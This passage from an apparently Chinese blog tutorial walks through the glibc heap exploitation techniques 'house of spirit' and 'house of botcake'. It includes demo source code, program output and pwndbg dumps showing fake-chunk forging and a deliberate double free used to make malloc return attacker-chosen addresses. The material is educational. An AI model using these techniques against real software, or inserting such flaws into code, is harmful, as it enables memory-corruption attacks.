chunks的fake区域地址来覆写我们的指针</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br>  <span class="hljs-comment">//要注意的是,chunk必须是16字节对齐的</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);<br>a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the overwritten pointer.\n&quot;</span>);<br><span class="hljs-built_in">free</span>(a);<br>  <span class="hljs-comment">//现在下一次的malloc就将会返回我们的fake chunk了</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>看完源代码可以发现,我们正常的hos是需要伪造两个chunk的,而tcache则不需要伪造下一个chunk,但是虽然本例中需要伪造两个chunk,但是我们所伪造的第二个chunk是可以不用为fastbin大小的chunk的</p><h2 id="运行结果-2"><a href="#运行结果-2" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">This <span class="hljs-built_in">file</span> demonstrates <span class="hljs-keyword">the</span> house <span class="hljs-keyword">of</span> spirit attack.<br>Calling malloc() once so that <span class="hljs-keyword">it</span> sets up its memory.<br>We will now overwrite <span class="hljs-keyword">a</span> pointer <span class="hljs-built_in">to</span> point <span class="hljs-built_in">to</span> <span class="hljs-keyword">a</span> fake <span class="hljs-string">&#x27;fastbin&#x27;</span> region.<br>This region (memory <span class="hljs-keyword">of</span> <span class="hljs-built_in">length</span>: <span class="hljs-number">80</span>) <span class="hljs-keyword">contains</span> <span class="hljs-literal">two</span> chunks. The <span class="hljs-keyword">first</span> starts <span class="hljs-keyword">at</span> <span class="hljs-number">0x7ffe23a56258</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> <span class="hljs-keyword">at</span> <span class="hljs-number">0x7ffe23a56298</span>.<br>This chunk.size <span class="hljs-keyword">of</span> this region has <span class="hljs-built_in">to</span> be <span class="hljs-number">16</span> more than <span class="hljs-keyword">the</span> region (<span class="hljs-built_in">to</span> accommodate <span class="hljs-keyword">the</span> chunk data) <span class="hljs-keyword">while</span> still falling <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> fastbin category (&lt;= <span class="hljs-number">128</span> <span class="hljs-keyword">on</span> <span class="hljs-title">x64</span>). <span class="hljs-title">The</span> <span class="hljs-title">PREV_INUSE</span> (<span class="hljs-title">lsb</span>) <span class="hljs-title">bit</span> <span class="hljs-title">is</span> <span class="hljs-title">ignored</span> <span class="hljs-title">by</span> <span class="hljs-title">free</span> <span class="hljs-title">for</span> <span class="hljs-title">fastbin-sized</span> <span class="hljs-title">chunks</span>, <span class="hljs-title">however</span> <span class="hljs-title">the</span> <span class="hljs-title">IS_MMAPPED</span> (<span class="hljs-title">second</span> <span class="hljs-title">lsb</span>) <span class="hljs-title">and</span> <span class="hljs-title">NON_MAIN_ARENA</span> (<span class="hljs-title">third</span> <span class="hljs-title">lsb</span>) <span class="hljs-title">bits</span> <span class="hljs-title">cause</span> <span class="hljs-title">problems</span>.<br>... note that this has <span class="hljs-built_in">to</span> be <span class="hljs-keyword">the</span> size <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> next malloc request rounded <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> internal size used <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> malloc implementation. E.g. <span class="hljs-keyword">on</span> <span class="hljs-title">x64</span>, <span class="hljs-title">0x30-0x38</span> <span class="hljs-title">will</span> <span class="hljs-title">all</span> <span class="hljs-title">be</span> <span class="hljs-title">rounded</span> <span class="hljs-title">to</span> <span class="hljs-title">0x40</span>, <span class="hljs-title">so</span> <span class="hljs-title">they</span> <span class="hljs-title">would</span> <span class="hljs-title">work</span> <span class="hljs-title">for</span> <span class="hljs-title">the</span> <span class="hljs-title">malloc</span> <span class="hljs-title">parameter</span> <span class="hljs-title">at</span> <span class="hljs-title">the</span> <span class="hljs-title">end</span>. <br>The chunk.size <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> *next* fake region has <span class="hljs-built_in">to</span> be sane. That is &gt; <span class="hljs-number">2</span>*SIZE_SZ (&gt; <span class="hljs-number">16</span> <span class="hljs-keyword">on</span> <span class="hljs-title">x64</span>) &amp;&amp; &lt; <span class="hljs-title">av</span>-&gt;<span class="hljs-title">system_mem</span> (&lt; <span class="hljs-title">128kb</span> <span class="hljs-title">by</span> <span class="hljs-title">default</span> <span class="hljs-title">for</span> <span class="hljs-title">the</span> <span class="hljs-title">main</span> <span class="hljs-title">arena</span>) <span class="hljs-title">to</span> <span class="hljs-title">pass</span> <span class="hljs-title">the</span> <span class="hljs-title">nextsize</span> <span class="hljs-title">integrity</span> <span class="hljs-title">checks</span>. <span class="hljs-title">No</span> <span class="hljs-title">need</span> <span class="hljs-title">for</span> <span class="hljs-title">fastbin</span> <span class="hljs-title">size</span>.<br>Now we will overwrite our pointer <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> address <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> fake region inside <span class="hljs-keyword">the</span> fake <span class="hljs-keyword">first</span> chunk, <span class="hljs-number">0x7ffe23a56258</span>.<br>... note that <span class="hljs-keyword">the</span> memory address <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> *region* associated <span class="hljs-keyword">with</span> this chunk must be <span class="hljs-number">16</span>-<span class="hljs-keyword">byte</span> aligned.<br>Freeing <span class="hljs-keyword">the</span> overwritten pointer.<br>Now <span class="hljs-keyword">the</span> next malloc will <span class="hljs-literal">return</span> <span class="hljs-keyword">the</span> region <span class="hljs-keyword">of</span> our fake chunk <span class="hljs-keyword">at</span> <span class="hljs-number">0x7ffe23a56258</span>, which will be <span class="hljs-number">0x7ffe23a56260</span>!<br>malloc(<span class="hljs-number">0x30</span>): <span class="hljs-number">0x7ffe23a56260</span><br></code></pre></td></tr></table></figure><h2 id="关键调试"><a href="#关键调试" class="headerlink" title="关键调试"></a>关键调试</h2><p>本例断点下在了</p><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">► <span class="hljs-number">11</span> fprintf(stderr, <span class="hljs-comment">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);<br>  <span class="hljs-number">12</span> unsigned long long *a;<br><br>  <span class="hljs-number">20</span> fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; // this is the size<br>► <span class="hljs-number">22</span> fprintf(stderr, <span class="hljs-comment">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);<br><br>  <span class="hljs-number">24</span> fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; // nextsize<br>  <span class="hljs-number">25</span> <br>► <span class="hljs-number">26</span> fprintf(stderr, <span class="hljs-comment">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br><br>► <span class="hljs-number">28</span> a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br>► <span class="hljs-number">31</span> free(a);<br></code></pre></td></tr></table></figure><p>好嘞,我们现在进入调试</p><p>首先是初始话堆的过程</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x555555757000</span> PREV_INUSE &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">593</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x555555757250</span> FASTBIN &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">33</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x20d91</span><br>&#125;<br><span class="hljs-number">0x555555757270</span> PREV_INUSE &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">134545</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们打印一下我们的fake_chunks</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; p/x fake_chunks<br><span class="hljs-number">$2</span> = &#123;<span class="hljs-number">0x9</span>, <span class="hljs-number">0x7ffff7dd7660</span>, <span class="hljs-number">0x7fffffffe5f8</span>, <span class="hljs-number">0xf0b5ff</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x555555554a2d</span>, <span class="hljs-number">0x7ffff7de59a0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x5555555549e0</span>, <span class="hljs-number">0x5555555546c0</span>&#125;<br>pwndbg&gt; p/x &amp;fake_chunks<br><span class="hljs-number">$3</span> = <span class="hljs-number">0x7fffffffe580</span><br></code></pre></td></tr></table></figure><p>之后我们来伪造我们的fake_chunk,我们将第一个fake chunk的size设为0x40</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; p/x fake_chunks<br><span class="hljs-number">$4</span> = &#123;<span class="hljs-number">0x9</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x7fffffffe5f8</span>, <span class="hljs-number">0xf0b5ff</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x555555554a2d</span>, <span class="hljs-number">0x7ffff7de59a0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x5555555549e0</span>, <span class="hljs-number">0x5555555546c0</span>&#125;<br>pwndbg&gt; x/10gx fake_chunks<br><span class="hljs-number">0x7fffffffe580</span>:<span class="hljs-number">0x0000000000000009</span><span class="hljs-number">0x0000000000000040</span><br><span class="hljs-number">0x7fffffffe590</span>:<span class="hljs-number">0x00007fffffffe5f8</span><span class="hljs-number">0x0000000000f0b5ff</span><br><span class="hljs-number">0x7fffffffe5a0</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000555555554a2d</span><br><span class="hljs-number">0x7fffffffe5b0</span>:<span class="hljs-number">0x00007ffff7de59a0</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffe5c0</span>:<span class="hljs-number">0x00005555555549e0</span><span class="hljs-number">0x00005555555546c0</span><br><span class="hljs-number">$5</span> = &#123;<br>  mchunk_prev_size = <span class="hljs-number">9</span>, <br>  mchunk_size = <span class="hljs-number">64</span>, <br>  fd = <span class="hljs-number">0x7fffffffe5f8</span>, <br>  bk = <span class="hljs-number">0xf0b5ff</span>, <br>  fd_nextsize = <span class="hljs-number">0x1</span>, <br>  bk_nextsize = <span class="hljs-number">0x555555554a2d</span> &lt;__libc_csu_init+<span class="hljs-number">77</span>&gt;<br>&#125;<br></code></pre></td></tr></table></figure><p>此时如果是tcache_hos的话已经可以了,但我们fastbin的话就需要使下一个chunk合法,也就是要给我们的fake_chunks[9]赋值了</p><p>为什么是fake_chunks[9]呢?因为在程序中,我们需要连续伪造两块chunk,而本例中第一块chunk的size将设为0x40了,因此fake_chunk[1]是第一个伪造的chunk的size的话,我们第二个伪造的chunk就要往下0x40也就是fake_chunk[1]+8的地方,即fake_chunk<a href="%E8%BF%99%E9%87%8C%E8%AF%B4%E6%98%8E%E6%97%B6%E6%88%91%E5%B0%B1%E4%BB%A5size%E4%B8%BA%E5%9F%BA%E5%87%86%E4%BA%86%EF%BC%8C%E5%87%86%E7%A1%AE%E4%B8%80%E7%82%B9%E7%9A%84%E8%AF%B4%E6%B3%95%E6%98%AFfake_chunks%E5%92%8Cfake_chunks%5B8%5D%E5%A4%84%E8%BF%9E%E7%BB%AD%E4%BC%AA%E9%80%A0%E4%B8%A4%E4%B8%AAchunk">9</a></p><p>赋值的大小就无所谓惹,只要比16大128kb小就好(64位机上)</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; p/x fake_chunks<br><span class="hljs-number">$6</span> = &#123;<span class="hljs-number">0x9</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x7fffffffe5f8</span>, <span class="hljs-number">0xf0b5ff</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x555555554a2d</span>, <span class="hljs-number">0x7ffff7de59a0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x5555555549e0</span>, <span class="hljs-number">0x1234</span>&#125;<br>pwndbg&gt; x/10gx fake_chunks<br><span class="hljs-number">0x7fffffffe580</span>:<span class="hljs-number">0x0000000000000009</span><span class="hljs-number">0x0000000000000040</span><br><span class="hljs-number">0x7fffffffe590</span>:<span class="hljs-number">0x00007fffffffe5f8</span><span class="hljs-number">0x0000000000f0b5ff</span><br><span class="hljs-number">0x7fffffffe5a0</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000555555554a2d</span><br><span class="hljs-number">0x7fffffffe5b0</span>:<span class="hljs-number">0x00007ffff7de59a0</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffe5c0</span>:<span class="hljs-number">0x00005555555549e0</span><span class="hljs-number">0x0000000000001234</span><br>pwndbg&gt; p *(struct malloc_chunk*) <span class="hljs-number">0x7fffffffe5c0</span><br><span class="hljs-number">$7</span> = &#123;<br>  mchunk_prev_size = <span class="hljs-number">93824992233952</span>, <br>  mchunk_size = <span class="hljs-number">4660</span>, <br>  fd = <span class="hljs-number">0x7fffffffe6c0</span>, <br>  bk = <span class="hljs-number">0xcd9707df6838000</span>, <br>  fd_nextsize = <span class="hljs-number">0x5555555549e0</span> &lt;__libc_csu_init&gt;, <br>  bk_nextsize = <span class="hljs-number">0x7ffff7a05b97</span> &lt;__libc_start_main+<span class="hljs-number">231</span>&gt;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后我们把fake_chunks赋给a,为什么使fake_chunks[2]不是fake_chunks,之前已经做过解释,就是因为用户指针mem是从chunk的fd开始的,而不是从pre_size域开始的</p><p>现在free掉a</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x40 [  1]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x7fffffffe590 ◂— 0x0</span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>可以看到我们伪造的chunk已经在bins中了,此时只需要我们malloc一个0x40的chunk就可以从链中取出来了</p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>对于没有tcache的glibc版本而言,我们需要连续伪造两块size合法的chunk,并且第二块chunk的size并不需要满足fastbin的要求,只要满足合法的size即可</p><p>本程序首先初始话了一下堆,然后申请了两个变量,一个是我们即将攻击的变量 a,另一个是我们的fake_chunks</p><p>程序先在fake_chunks[1]的地方也就是size域伪造了合法的size,0x40(满足fastbin size大小,与16字节对齐,标志位正确)</p><p>之后又在下一处伪造了第二个chunk,即从fake_chunks[8]开始的地方,这是为什么呢,因为我们第一个fake chunk的size伪造成了0x40,那么我们第二个chunk就需要在向下0x40的地方也就是fake_chunks+8的地方伪造第二个chunk</p><h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h1><h2 id="序-4"><a href="#序-4" class="headerlink" title="序"></a>序</h2><p>记得文章开头我说过glibc2.29中将我们的tcache double free扼住了咽喉吗，这里我们就可以用house of botcake来修改我们的fd指针了</p><p>house of botcake运用了chunk overlapping的方法,将我们的chunk同时放在了unsorted bin和tcache中,与我们的fastbin_dup_consolidate很相似但不太一样</p><p>下面我们就来看看这个新增的攻击技巧吧,由于本例的特殊性,我会在ubuntu 19.04的docker上进行调试</p><p>首先我们进入源代码</p><h2 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">//本攻击可以bypass glibc 新增加的一些限制,如果libc没有该限制,我们可以直接用double free来做更简单的tcache poisoning了</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * This attack should bypass the restriction introduced in</span><br><span class="hljs-comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span><br><span class="hljs-comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span><br><span class="hljs-comment">     * simple tcache poisoning</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">//关闭缓冲区并使得_FILE_IO不会影响到我们的堆</span><br>    <span class="hljs-comment">// disable buffering and make _FILE_IO does not interfere with our heap</span><br>    <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// introduction</span><br>    <span class="hljs-comment">//本demo是一个强力的攻击手段,通过tcache posioning attack来欺骗malloc返回一个指向任意地址的指针</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);<br>    <span class="hljs-comment">//本攻击仅依赖于double free</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This attack only relies on double free.\n&quot;</span>);<br><br>    <span class="hljs-comment">// prepare the target</span><br>    <span class="hljs-comment">//攻击目标</span><br>    <span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The address we want malloc() to return, namely,&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);<br><br>    <span class="hljs-comment">// prepare heap layout</span><br>    <span class="hljs-comment">//布置一下栈</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Preparing heap layout&quot;</span>);<br>    <span class="hljs-comment">//首先申请7个大小为0x100的chunks来为后面填满tcache做准备</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-built_in">sizeof</span>(x)/<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++)&#123;<br>        x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    &#125;<br>    <span class="hljs-comment">//为了后面consolidation而申请一个chunk</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a chunk for later consolidation&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-comment">//申请我们的vitcim chunk</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating the victim chunk.&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); <br>    <span class="hljs-comment">//申请一个用于防止合并的chunk</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <br>    <span class="hljs-comment">// cause chunk overlapping</span><br>    <span class="hljs-comment">//现在需要我们来做一个chunk overlapping</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we are able to cause chunk overlapping&quot;</span>);<br>    <span class="hljs-comment">//首先填满tcache list</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 1: fill up tcache list&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;<br>        <span class="hljs-built_in">free</span>(x[i]);<br>    &#125;<br>    <span class="hljs-comment">//第二步:将我们的victim free掉来让他被扔到unsorted bin中</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-comment">//第三步:free前面的chunk来与我们的victim chunk合并</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);<br>    <span class="hljs-built_in">free</span>(prev);<br>    <span class="hljs-comment">//第四步:通过从tcache中取出一个chunk来把我们的victim chunk放到tcache list中,并且再free一次victim chunk</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-comment">/*VULNERABILITY*/</span><br>    <span class="hljs-built_in">free</span>(a);<span class="hljs-comment">// a is already freed</span><br>    <span class="hljs-comment">/*VULNERABILITY*/</span><br>    <br>    <span class="hljs-comment">//简单的tcache poisoning</span><br>    <span class="hljs-comment">// simple tcache poisoning</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Launch tcache poisoning&quot;</span>);<br>    <span class="hljs-comment">//现在victim被包含在一个更大的free chunk中,我们可以通过overlapp chunk来做一个简单的tcache poisoning</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *b = <span 